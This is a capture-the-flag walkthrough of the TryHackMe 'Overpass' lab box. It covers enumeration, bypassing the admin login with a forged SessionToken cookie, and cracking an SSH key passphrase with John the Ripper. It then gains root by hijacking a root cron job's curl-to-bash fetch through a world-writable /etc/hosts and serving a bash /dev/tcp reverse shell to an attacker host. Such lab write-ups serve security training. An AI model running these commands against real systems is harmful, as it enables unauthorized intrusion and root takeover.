Overpass

# Overpass [THM](https://tryhackme.com/room/overpass)

### Scanning / Enumeration

Let see what this box has

```bash
nmap -sV -T4 -A 10.10.10.26
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 13:57 GMT
Nmap scan report for 10.10.10.26
Host is up (0.028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                     
|_http-title: Overpass                                                                             
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                            

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
```

Using Gobuster we were able to discover some potential interesting folders

```bash
gobuster dir -u http://10.10.10.26 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/img (Status: 301)
/downloads (Status: 301)
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
``` 

```bash
gobuster dir -u http://10.10.10.26/downloads -w /usr/share/wordlists/dirb/common.txt 
                                  
/index.html (Status: 301)
/src (Status: 301)
```

While browsing the site manually, we had discover few interesting leads

http://10.10.10.26/downloads/
http://10.10.10.26/downloads/src/overpass.go
http://10.10.10.26/downloads/src/buildscript.sh

`aboutus` contains a list of the project staff.
Perhaps a list of potential users wwe can exploit?

- Ninja - Lead Developer
- Pars - Shibe Enthusiast and Emotional Support Animal Manager
- Szymex - Head Of Security
- Bee - Chief Drinking Water Coordinator
- MuirlandOracle - Cryptography Consultant


Looking at the source code of `admin` a login form, we were able to see that the site has few JS files.

- http://10.10.10.26/login.js
- http://10.10.10.26/main.js
- http://10.10.10.26/cookie.js


The `login.js` seems really interresting 


```js
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

### Exploitation

The function `login()` in `login.js` creates a cookie then redirect the window to the admin page. 

Using my browser, I created a cookie name Sessiontoken (with a value of 1) and went to `/admin`.

The content of the admin page is contains an SSH private key.

```bash
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
[ REDACTED ]
-----END RSA PRIVATE KEY-----
```

In this page we have 2 potentials users: James (and his private key) and paradox

A quick connexion to the SSH of this box confirms the that the ssh key needs a password

```bash
ssh -i key james@10.10.10.26

The authenticity of host '10.10.10.26 (10.10.10.26)' can't be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.26' (ECDSA) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "key": bad permissions
james@10.10.10.26's password: 
```

#### Crack the Private Key

I am using `John The Ripper` to crack this password

```bash
locate ssh2john

/usr/share/john/ssh2john.py
```
```bash
python /usr/share/john/ssh2john.py key > key.hash

john --wordlist=/usr/share/wordlists/rockyou.txt key.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxx          (key)
Warning: Only 3 candidates left, minimum 4 needed for performance.
1g 0:00:00:05 DONE (2020-12-26 14:47) 0.1757g/s 2520Kp/s 2520Kc/s 2520KC/sabygurl69..*7¡Vamos!
Session completed
```

We have the password ! 

```bash
john --show key.hash 
key:xxxx

1 password hash cracked, 0 left
```

#### SSH into the target

```bash
chmod 400 key

ssh -i key james@10.10.10.26

Enter passphrase for key 'key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec 26 14:57:21 UTC 2020

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 16%                IP address for eth0: 10.10.10.26
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
james@overpass-prod:~$ 
```

#### Hack the machine and get the flag in user.txt

We can get the first flag

```bash
cat /home/james/user.txt
thm{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

#### Escalate your privileges and get the flag in root.txt


A quick look into James account reveals some potential avenue to exploit the root

```bash
cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

Checking the machine for more information (sudoers, etc...), we had a hit in the `crontab`

```bash
james@overpass-prod:/usr/local/go$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

We can see the buildscript.sh is being called from the domain `overpass.thm/`.
More reseaarch on that domain, we can see that it is actually managed locally.

```bash
james@overpass-prod:/usr/local/go$ nslookup overpass.thm
Server:         127.0.0.53
Address:        127.0.0.53#53

Non-authoritative answer:
Name:   overpass.thm
Address: 127.0.0.1
```

```bash
james@overpass-prod:/usr/local/go$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

James has the permissions to change the hosts file

```bash
james@overpass-prod:/usr/local/go$ ls -ail /etc/hosts
1049292 -rw-rw-rw- 1 root root 250 Jun 27 02:39 /etc/hosts
```

I have changed the IP address of overpass.thm to my Kali.

In Kali, I have recreated the path of `overpass.thm/downloads/src/buildscript.sh`

```bash
mkdir -p downloads/src/
touch downloads/src/buildscript.sh
```
In the buildscript.sh I have added a bind shell

```bash
cat downloads/src/buildscript.sh 
#!/bin/bash

bash -i >& /dev/tcp/[ATTACKER-IP]/1234 0>&1
```

A simple http server to serve the new file

```bash
sudo python -m SimpleHTTPServer 80

Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.26 - - [26/Dec/2020 15:51:03] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
10.10.10.26 - - [26/Dec/2020 15:52:03] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```
On my Kali, I have started a reverse shell, which gives us the root access when the cron runs

```bash
nc -nvlp 1234

listening on [any] 1234 ...
connect to [IP] from (UNKNOWN) [10.10.10.26] 39080
bash: cannot set terminal process group (3990): Inappropriate ioctl for device
bash: no job control in this shell

root@overpass-prod:~# id 
id 
uid=0(root) gid=0(root) groups=0(root)

root@overpass-prod:~# cat /root/root.txt
cat /root/root.txt
thm{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
